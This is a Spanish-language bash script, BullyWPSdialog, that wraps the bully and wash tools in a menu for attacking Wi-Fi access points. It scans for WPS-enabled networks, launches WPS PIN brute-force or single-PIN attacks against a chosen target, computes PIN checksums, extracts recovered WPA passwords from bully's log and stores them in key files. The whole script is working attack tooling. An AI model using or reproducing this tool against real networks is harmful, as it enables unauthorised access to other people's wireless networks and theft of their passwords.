#!/bin/bash

# VERSION 0.1  12/09/2013
# -----------------------
# - Fecha de salida
#
# VERSION 0.2  12/09/2013 
# -----------------------
# - Solucionado bug con ESSIDs que contengan espacios (Warcry)
#
# VERSION 0.3  13/09/2013 
# -----------------------
# - Añadido parametro -N para que las ralink no fallen. (USUARIONUEVO)
#
# VERSION 0.4  13/09/2013 
# -----------------------
# - Añadido parametro -F para evitar warnings si cambiamos de ataque secuencial a random o viceversa. 
#  (USUARIONUEVO)
#
# VERSION 0.5  19/09/2013 
# -----------------------
# - Añadido parámetro -hold para que no se cierre la xterm en caso de que se produzca algún error.
# - Solucionado problema que impedía leer la clave WPA del log de bully.
# - Se sustituye la función de desmontar interfaces en modo monitor por la de desmontar y volver 
#   a montar el driver de la interface (es mas efectivo).
# - Ahora al seleccionar objetivo, se comprueba si la clave ya se ha obtenido anteriormente y 
#   en caso afirmativo, se muestra la clave junto con la información del objetivo.
#
# VERSION 0.6  24/09/2013 
# -----------------------
# - Modificada funciona de reseteo de interface para añadir al final un ifconfig up
# - Ahora se "resetea" la interface también al salir del script.
# 
# VERSION 0.7  24/09/2013 
# -----------------------
# - Solucionado bug que probocaba que se quedara el PIN "fijado" 
#   en el ataque de fuerza bruta habiendo realizado anteriormente 
#   un ataque introduciendo un PIN especifico.
# - Solucionado un error ortográfico.
# 
# VERSION 0.8.1  26/09/2013 
# -----------------------
# - Mejorada la función de detectar driver para identificar correctamnete 
#   el driver WiLink.
# - Añadido un sleep después de desmonta el driver y otro después de volver
#   a montarlo, para evitar problemas con el driver ath9k.
#
# VERSION 0.9  29/09/2013 
# -----------------------
# - Adaptada la función de salvar la clave WPA (Necesario para que funcione con las 
#   últimas versiones de bully).
# - Se añade la función de actualizar Bully desde GitHub.
# - Se añade comprobación de privilegios al ejecutar el script.
# - Algunos cambios menores en el código.
#
# VERSION 1.0  06/02/2014 
# -----------------------
# - Se añade la función de blacklistear la interface en la config de NetworkManager
#   para evitar conflictos en Wifislax-4.8


# Variables globales
SCRIPT="BullyWPSdialog"
VERSION="1.0"
BACKTITLE="$SCRIPT $VERSION - By geminis_demon - SeguridadWireless.Net"
TMP="/tmp/$SCRIPT"
KEYS="$HOME/swireless/$SCRIPT/Keys"


# Función que actualiza bully a la última versión
bully_updater() {

# Función que se encarga de descargar, compilar e instalar
update_bully() {

echo -e -n "\n - Descargando Bully ${VERSION_GIT}... "

# Descargamos la última versión de bully
curl -s -o "$TMP/bully-${VERSION_GIT}.zip" \
https://codeload.github.com/bdpurcell/bully/zip/master

if [ $? = 0 ]; then
	sleep 1
	echo "OK"
else
	echo "ERROR"
	sleep 1
	return 1
fi

echo -e -n "\n - Extrallendo el paquete... "

# Extraemos el .zip
unzip -q "$TMP/bully-${VERSION_GIT}.zip" -d "$TMP"

if [ $? = 0 ]; then
	sleep 1
	echo "OK"
else
	echo "ERROR"
	sleep 1
	return 1
fi


echo -e -n "\n - Compilando las fuentes... "

# Compilamos el código fuente
cd "$TMP/bully-master/src"
make -j >/dev/null 2>&1

if [ $? = 0 ]; then
	sleep 1
	echo "OK"
else
	echo "ERROR"
	sleep 1
	return 1
fi

sleep 1

echo -e -n "\n - Instalando Bully... "

# Instalamos bully en /usr/bin
cp bully /usr/bin

if [ $? = 0 ]; then
	sleep 1
	echo "OK"
else
	echo "ERROR"
	sleep 1
	return 1
fi

echo -e "\n "

}

# Si no hay conexión a internet, no se puede continuar
if [ ! "$(ping google.com -c1 2>/dev/null)" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " NO HAY CONEXIÓN " \
	       --ok-label "Volver al menú" \
	       --msgbox "\nPara actualizar bully, primero \
			debes conectarte a internet. \n " 0 0
	sleep 1
	
	# Volvemos al menú principal
	menu
fi

# Guardamos la versión actual en una variable
VERSION="$(bully --version 2>/dev/null)"

# Guardamos la versión de GitHub en una variable
VERSION_GIT="$(curl -s \
https://raw.github.com/bdpurcell/bully/master/src/version.h|\
tr -d '"'|awk '{print $3}')"

# Comprobamos si ya tenemos la última versión
if [ "$VERSION" = "$VERSION_GIT" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " BULLY UPDATER " \
	       --ok-label "Volver al menú" \
	       --msgbox "\nYa tienes la última versión instalada\n " 0 0
	
	# Volvemos al menú principal
	menu
else

	# Diálogo que permite elegir si actualizar o no
	dialog --backtitle "$BACKTITLE" \
	       --title " BULLY UPDATER " \
	       --yes-label "Actualizar" \
	       --no-label "No actualizar" \
	       --yesno "\nHay una actualización de bully disponible \n\
			\n  - Última versión: $VERSION_GIT \
			\n  - Versión actual: $VERSION \n " 0 0
	
	# Si dialog devuelve el valor 0, procedemos con la actualización
	if [ $? = 0 ]; then
		
		# Ejecutamos el updater y guardamos la salida en un archivo
		update_bully >"$TMP/updater.txt" & 
		
		# Guardamos el proceso del updater en una variable
		PID=$!
		
		# Mientras exista el proceso, vamos lellendo la salida del updater
		while [ -e /proc/$PID ]; do
			sleep 1
			TEXT="$(cat "$TMP/updater.txt")"
			dialog --backtitle "$BACKTITLE" \
			       --title " BULLY UPDATER " \
			       --infobox "$TEXT" 0 0
		done
		sleep 3
		
		# Se vuelve a comprobar la versión instalada
		VERSION="$(bully --version 2>/dev/null)"
		
		# Si la versión instalada corresponde con la versión de GitHub,
		# significa que todo ha salido bien, en caso contrario 
		# se informa del error.
		if [ "$VERSION" = "$VERSION_GIT" ]; then
			MSGBOX="Bully se ha actualizado correctamente \
			a la versión $VERSION"
		else
			MSGBOX="Ocurrió un error durante la actualización"
		fi
		dialog --backtitle "$BACKTITLE" \
		       --title " BULLY UPDATER " \
		       --ok-label "Volver al menú" \
		       --msgbox "\n$MSGBOX \n " 0 0
		       
		sleep 1
	fi	
fi

# Se eliminan los archivos temporales
[ -e "$TMP/bully-${VERSION_GIT}.zip" ] && rm -rf "$TMP/bully-${VERSION_GIT}.zip"
[ -e "$TMP/bully-master" ] && rm -rf "$TMP/bully-master"


# Volvemos al menú principal
menu

}

# Función que obtiene PIN y clave WPA del log de bully
obtener_clave_wpa() {

# En caso de que el retun de bully no sea 0, de da por echo que no se ha obtenido la clave
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then

	# Se parsea el log de bully para obtener el PIN y la clave WPA
	WPS_PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
	CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
	
	# Si el BSSID objetivo cumple con el CheckSum,
	# este se calcula para saber cual es el último dígito del PIN
	# (ya podría venir el PIN completo en el log de bully ¬¬)
	if [ ! "$NO_CHECKSUM" ]; then 
		WPS_PIN=$(echo $WPS_PIN|cut -b 1,2,3,4,5,6,7)
		pin=$WPS_PIN
		wps_pin_checksum
		WPS_PIN=$WPS_PIN$PIN_p2
	fi
else
	unset WPS_PIN
	unset CLAVE_WPA
fi

}

# Función que desmonta y vuelve a montar el driver de la interface seleccionada
reset_iface() {

if [ "$INTERFACE" ]; then

	# Identificamos el driver de la interface seleccionada
	DRIVER="$(basename "$(ls -l "/sys/class/net/$INTERFACE/device/driver")")"
	if [ ! "$DRIVER" ] && [ -d "/sys/class/net/tiwlan0/wireless" ]; then
		DRIVER="WiLink"
	fi
	
	# Se desmonta y se vuelve a montar el driver
	rmmod -f "$DRIVER" >/dev/null 2>&1
	sleep 1
	modprobe "$DRIVER" >/dev/null 2>&1
	sleep 3
	
	# Se pone la interface "up" para evitar problemas 
	# con algunos adaptadores inalámbricos
	ifconfig "$INTERFACE" up >/dev/null 2>&1
fi

}

# Función comprobar si la interface está asociada a un punto de acceso
comprobacion_interface_asociada() {

# Si la interface está asociada, no se puede continuar
if [ ! "$(iwconfig $INTERFACE|grep "Not-Associated")" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " NO SE PUEDE CONTINUAR " \
	       --ok-label "Salir" \
	       --msgbox "\nPara evitar errores, la interface $INTERFACE \
	                no debe estar asociada a un punto de acceso.\n " 0 0
	Salir
fi

}

# Función salvar clave WPA
salvar_clave_wpa() {

# Si no se ha obtenido la clave WPA, informamos de ello y volvemos al menú
if [ ! "$CLAVE_WPA" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " PROCESO COMPLETADO " \
	       --ok-label "Volver al menú" \
	       --msgbox "\nNo ha sido posible obtener la clave WPA\n " 0 0
	       
	# Si dialog no devuelve el valor 0, salimos
	if [ $? != 0 ]; then
		reset_iface; Salir
	fi
	
	menu
fi

# Si existe la ruta $KEYS y no es un directorio se elimina
if [ -e "$KEYS" ] && [ ! -d "$KEYS" ]; then rm -rf "$KEYS"; fi

# Si no existe la ruta $KEYS la creamos
if [ ! -d "$KEYS" ]; then mkdir -p "$KEYS"; fi

# Salvamos la clave en un archivo de texto
NOMBRE="$ESSID_$(echo "$BSSID"|tr ':' '-')"
cat << EOF >"$TMP/$NOMBRE.key"
    ESSID: $ESSID
    BSSID: $BSSID
  PIN WPS: $WPS_PIN
CLAVE WPA: $CLAVE_WPA
EOF

# Convertimos el texto a formato windows
cat "$TMP/$NOMBRE.key"|sed -e 's/$/\r/' >"$KEYS/$NOMBRE.txt"

# Diálogo que informa donde se ha guardado la clave WPA
dialog --backtitle "$BACKTITLE" \
       --title " PROCESO COMPLETADO " \
       --ok-label "Volver al menú" \
       --msgbox "\n¡Se ha obtenido con exito la clave WPA! \
                \nLa clave ha sido guardada en: \n\n$KEYS/$NOMBRE.txt" 0 0

# Saltamos al menú principal
menu
}

# Función lanzar ataque de fuerza bruta con bully
bully_wps() {

# Si no se ha seleccionado ningún objetivo no se puede continuar
if [ ! "$ESSID" -o ! "$BSSID" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " NO SE PUEDE CONTINUAR " \
	       --ok-label "Volver al menú" \
	       --msgbox "\nNo se ha seleccionado ningún objetivo\n " 0 0
	menu
fi

# Si no existe la interface en modo monitor, 
# llamamos a la función seleccionar_interface.
if [ -z "$INTERFACE_MON" -o ! "$(iwconfig 2>/dev/null|grep "^$INTERFACE_MON")" ]; then
	seleccionar_interface
else 

	# Se comprueba que la interface no esté asociada
	comprobacion_interface_asociada
fi

# Si el BSSID corresponde con 8C:0C:A3, el PIN no cumple con el CheckSum
if [ "$(echo "$BSSID"|cut -d':' -f1,2,3)" = "8C:0C:A3" ]; then
	NO_CHECKSUM="-B"
	LONGITUD_PIN="8"
else
	unset NO_CHECKSUM
	LONGITUD_PIN="7"
fi

# Si se ha elejido la opción de introducir PIN manualmente, mostramos el diálogo para introducir el pin
if [ "$1" = "--Pin" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " INTRODUCIR PIN MANUALMENTE " \
	       --cancel-label "Volver al menú" \
	       --max-input "$LONGITUD_PIN" \
	       --inputbox "\nIn troduce el PIN con un máximo de $LONGITUD_PIN dígitos:" 0 0 \
	2>"$TMP/PIN_WPS.txt"
	
	# Si el comando anterior no devuelve el valor 0, volvemos al menú
	if [ ! $? = 0 ]; then menu; fi
	
	# Si no se intruduce un valor numérico, no se puede continuar
	if [ ! "$(cat "$TMP/PIN_WPS.txt"|grep "^[0-9]*$")" ]; then
		dialog --backtitle "$BACKTITLE" \
		       --title " ERROR " \
		       --msgbox "\nDebes introducir un valor numérico\n " 0 0
		bully_wps --Pin
	fi
	
	# Guardamos en una variable el PIN junto con los parámetros para bully
	PIN_WPS="-S -p $(cat "$TMP/PIN_WPS.txt")"
else
	unset PIN_WPS
fi

# Lanzamos ataque con bully
xterm  -hold -fg FloralWhite -bg DarkBlue -T "Bully -> $ESSID" -e \
"bully -F -N -b $BSSID -c $CANAL -v 3 $PIN_WPS $NO_CHECKSUM $INTERFACE_MON" & BULLY_PID=$!

# Diálogo que aparecerá mientras se ejecuta el ataque
dialog --backtitle "$BACKTITLE" \
       --infobox "$INFO_AP\nSe ha puesto en marcha el ataque con bully, 
                 presiona \"Control+C\" para detener el proceso.\n " 16 49
       
# Si se presiona "Control+C", se detiene el proceso de bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT

# Mientras el proceso de bully esté activo, el script estrá "durmiendo"
while [ -e "/proc/$BULLY_PID" ]; do
	sleep 2
done

# Obtenemos el PIN y clave WPA
obtener_clave_wpa

# Salvamos PIN y clave en un archivo
salvar_clave_wpa

}

# Función seleccionar objetivo 
seleccionar_objetivo() {

# Si no se encuentran objetivos, no se puede continuar
if [ ! "$(cat "$TMP/wash_scan.txt")" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " NO SE PUEDE CONTINUAR " \
	       --ok-label "Volver al menú" \
	       --msgbox "\nNo se ha encontrado ningún objetivo con WPS activado.\n " 0 0
	menu
fi

# Creamos el menú para seleccionar objetivo
N=1
cat "$TMP/wash_scan.txt"|while read MAC CANAL PWR VER LOCK ESSID; do
	if [ "$LOCK" = "Yes" ]; then LOCK="Si"; fi
	echo "\"$N)\" \"$MAC    $LOCK       $CANAL     $(($PWR+100))    $ESSID\" \\"
	N=$(($N+1))
done >"$TMP/menu_objetivos.txt"

# Diálogo para seleccionar objetivo
dialog --backtitle "$BACKTITLE" \
       --title " SELECCIONAR OBJETIVO " \
       --cancel-label "Volver al menú" \
       --menu "\n              BSSID        Locked   Canal   PWR    ESSID" 0 0 0 \
       --file "$TMP/menu_objetivos.txt" \
2>"$TMP/seleccion.txt"

# Si el comando anterior no devuelve el valor 0, volvemos al menú
if [ ! $? = 0 ]; then menu; fi

# Definimos los parámetros que se le pasarán a bully
SELECCION=$(cat "$TMP/seleccion.txt")
ESSID="$(cat "$TMP/menu_objetivos.txt"|tr -d '"'|tr -d '\\'|grep "^$SELECCION"|cut -d' ' -f22-)"
BSSID="$(cat "$TMP/menu_objetivos.txt"|tr -d '"'|tr -d '\\'|grep "^$SELECCION"|awk '{print $2}')"
CANAL="$(cat "$TMP/menu_objetivos.txt"|tr -d '"'|tr -d '\\'|grep "^$SELECCION"|awk '{print $4}')"

# Comprobamos si la clave ya ha sido obtenida anteriormente
if [ -e "$KEYS/$(echo "$BSSID"|tr ':' '-').txt" ]; then
	WPS_PIN="$(cat "$KEYS/$(echo "$BSSID"|tr ':' '-').txt"|grep "PIN WPS:"|awk '{print $3}')"
	CLAVE_WPA="$(cat "$KEYS/$(echo "$BSSID"|tr ':' '-').txt"|grep "CLAVE WPA:"|awk '{print $3}')"
else 
	obtener_clave_wpa
fi

# Saltamos al menú principal
menu

}

# Función escanear con wash en busca de objetivos con WPS activado
escanear_wps() {

# Si no existe la interface en modo monitor, 
# llamamos a la función seleccionar_interface.
if [ -z "$INTERFACE_MON" -o ! "$(iwconfig 2>/dev/null|grep "^$INTERFACE_MON")" ]; then
	seleccionar_interface
else 

	# Se comprueba que la interface no esté asociada
	comprobacion_interface_asociada
fi

# Diálogo para introducir tiempo a escanear
dialog --backtitle "$BACKTITLE" \
       --title " ESCANEAR EN BUSCA DE OBJETIVOS " \
       --cancel-label "Volver al menú" \
       --max-input "2" \
       --inputbox "\nIntroduce el tiempo a escanear en segundos: \n " 0 0 \
2>"$TMP/segundos.txt"

# Si el comando anterior no devuelve el valor 0, volvemos al menú
if [ ! $? = 0 ]; then menu; fi

# Si no se introduce un valor numérico, no se puede continuar
if [ ! "$(cat "$TMP/segundos.txt"|grep "^[0-9]*$")" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " ERROR " \
	       --msgbox "\nDebes introducir un valor numérico\n " 0 0
	escanear_wps
fi

# Matámos proceso de wash para evitar conflictos
killall wash >/dev/null 2>&1

# Escaneamos con wash
wash -i $INTERFACE_MON -C -D 2>/dev/null|tail -n +3|grep -v "^$" >"$TMP/wash_scan.txt" &

# Diálogo que muestra barra de progreso mientras se escanea
N2=$(cat "$TMP/segundos.txt")
N1=1
while [ ! $(($N1-1)) -eq $N2 ]; do
	PORCENT=$(($(($N1*100))/$N2))
	echo $PORCENT
	sleep 1
	N1=$(($N1+1))
done|\
dialog --backtitle "$BACKTITLE" \
       --title " ESCANEANDO EN BUSCA DE OBJETIVOS " \
       --gauge "" 0 0 \
2>/dev/null

# Cuando pasa el tiempo programado, terminamos el rpoceso de wash
killall wash >/dev/null 2>&1
sleep 1

# Saltamos a la funcion seleccionar objetivo
seleccionar_objetivo 
}

# Función seleccionar interface y poner en modo monitor
seleccionar_interface() {

# Si no se encuentra ninguna tarjeta wifi, no se puede continuar
if [ ! "$(iwconfig 2>/dev/null|cut -d' ' -f1|grep -v "^$")" ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " NO SE PUEDE CONTINUAR " \
               --ok-label "Salir" \
               --msgbox "\nNo se ha detectado ninguna tarjeta wifi en este equipo.\n " 0 0
	Salir
fi

# Creamos el menú para seleccionar la interface
N=1
airmon-ng 2>/dev/null|egrep -v "^Interface|^$"|cut -d'-' -f1|\
while read INTERFACE CHIPSET MODELO DRIVER; do
	if [ "$(iwconfig 2>/dev/null|grep "^$INTERFACE"|grep -v "Mode:Monitor")" ]; then
		echo "\"$N\" \"$INTERFACE       $CHIPSET $MODELO      $DRIVER\" \\"
		N=$(($N+1))
	fi
done >"$TMP/menu_interfaces.txt"

# Diálogo para seleccionar interface
dialog --backtitle "$BACKTITLE" \
       --title " SELECCIONAR INTERFACE " \
       --cancel-label "Salir" \
       --menu "\n       Interface   Chipset            Driver" 0 0 0 \
       --file "$TMP/menu_interfaces.txt" \
2>"$TMP/seleccion.txt"

# Si dialog no devuelve el valor 0, salimos.
if [ ! $? = 0 ]; then Salir; fi

SELECCION="$(cat "$TMP/seleccion.txt")"
INTERFACE="$(cat "$TMP/menu_interfaces.txt"|tr -d '"'|tr -d '\\'|grep ^$SELECCION|awk '{print $2}')"
IFACE_MAC="$(cat "/sys/class/net/$INTERFACE/address"|tr '[:lower:]' '[:upper:]')"

# Se comprueba que la interface no esté asociada
comprobacion_interface_asociada

# Blacklisteamos la interface en la config de NetworkManager para evitar conflictos
[ "$(which blacklist-iface)" ] && blacklist-iface "$INTERFACE" OFF >/dev/null

# Se reinicia el driver de la interface seleccionada para evitar conflictos
reset_iface

# Ponemos la interface seleccionada en modo monitor
airmon-ng start $INTERFACE >"$TMP/log_airmon-ng.txt" 2>&1

# Si hay algún error al poner la interface en modo monitor no se puede continuar
if [ ! $? = 0 ]; then
	dialog --backtitle "$BACKTITLE" \
               --title " ERROR " \
               --ok-label "Salir" \
               --textbox "$TMP/log_airmon-ng.txt" 0 0
        reset_iface; Salir
fi

# Definimos interface en modo monitor
INTERFACE_MON="$(cat "$TMP/log_airmon-ng.txt"|grep "monitor mode enabled"|tr -d ')'|awk '{print $5}')"

dialog --backtitle "$BACKTITLE" \
       --infobox "\nSe utilizará $INTERFACE_MON en modo monitor\n " 0 0
sleep 2

}

# Yeah Niroz was here, computePIN by ZaoChunsheng, C portado a bash
wps_pin_checksum() {
  acum=0
  PIN_p2=0

  while [ $pin -gt 0 ]; do
    acum=$(($acum + (3 * ($pin % 10))))
    pin=$(($pin / 10))
    acum=$(($acum + ($pin % 10)))
    pin=$(($pin / 10))
  done

  result=$(((10 - ($acum % 10)) % 10))
  PIN_p2=$(($result % 10000000))
}


Salir() {
	
	[ "$INTERFACE_MON" ] && airmon-ng stop "$INTERFACE_MON" >/dev/null 2>&1
	[ "$(which blacklist-iface)" ] && blacklist-iface "$INTERFACE" ON >/dev/null
	exit
}

# Función menú principal
menu() {

# Información del objetivo
INFO_AP="
$(if [ "$ESSID" ] && [ "$BSSID" ] && [ "$CANAL" ]; then
	echo "\n\n        INFORMACIÓN DEL OBJETIVO\n"
	echo "   ************************************  \n"
	echo "      ESSID: $ESSID\n"
	echo "      BSSID: $BSSID\n"
	echo "      Canál: $CANAL\n"
	if [ "$WPS_PIN" ] && [ "$CLAVE_WPA" ]; then
		echo "    PIN WPS: $WPS_PIN\n"
		echo "  Clave WPA: $CLAVE_WPA\n"
		echo "   ************************************  \n\n"
	else
		echo "   ************************************  \n\n"
	fi
fi)"

# Diálogo con opciones del menú principal
dialog --backtitle "$BACKTITLE" \
       --title " MENU PRINCIPAL " \
       --cancel-label "Salir" \
       --menu "$INFO_AP\nSelecciona una opción:" 0 0 0 \
	      "1)" "Escanear en busca de objetivos" \
	      "2)" "Comenzar ataque de fuerza bruta" \
	      "3)" "Probar un PIN específico" \
	      "4)" "Seleccionar otro objetivo" \
	      "5)" "Actualizar Bully" \
2>"$TMP/seleccion.txt"

# Si dialog no devuelve el valor 0, salimos
if [ ! $? = 0 ]; then reset_iface; Salir; fi

# Dependiendo de la opción elegida, se llama a la función correspondiente
case $(cat "$TMP/seleccion.txt"|tr -d ')') in
	1 ) escanear_wps;;
	2 ) bully_wps;;
	3 ) bully_wps --Pin;;
	4 ) seleccionar_objetivo;;
	5 ) bully_updater;;
esac
}

# Si no tenemos permisos de root, no se puede continuar
if [ $(id -u) != 0 ]; then
	dialog --backtitle "$BACKTITLE" \
	       --title " NO SE PUEDE CONTINUAR " \
	       --ok-label "Salir" \
	       --msgbox "\nPara utilizar este script es necesario tener \
			permisos de root. \n " 0 0
	Salir
fi       

# Si existe la ruta $TMP y no es un directorio se elimina
if [ -e "$TMP" ] && [ ! -d "$TMP" ]; then rm -rf "$TMP"; fi

# Si no existe la ruta $TMP la creamos
if [ ! -d "$TMP" ]; then mkdir -p "$TMP"; fi

# Si el script se cierra por alguna razón, salimos de forma segura
trap "Salir" SIGHUP SIGILL

# Comienza el script mostrando el menú principal
menu
